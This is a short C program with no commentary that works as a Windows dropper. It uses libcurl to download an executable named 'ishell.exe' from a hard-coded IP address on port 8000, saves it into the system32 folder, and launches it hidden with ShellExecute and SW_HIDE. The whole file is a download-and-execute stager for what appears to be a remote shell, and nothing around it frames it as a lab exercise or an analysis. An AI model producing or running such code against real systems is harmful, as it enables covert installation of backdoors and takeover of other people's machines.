#define CURL_STATICLIB
#include <unistd.h>
#include <stdio.h>
#include <curl/curl.h>
#include <curl/easy.h>
#include <string.h>
#include <windows.h>

int main(void) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char url[256] = "http://10.230.229.13:8000/ishell.exe";
    char outfilename[128] = "c:\\windows\\system32\\ishell.exe";

    curl = curl_easy_init();

    if (curl) {
        fp = fopen(outfilename,"wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }

    ShellExecute(NULL, "open", "c:\\windows\\system32\\ishell.exe", NULL, NULL, SW_HIDE);
    return 0;
}

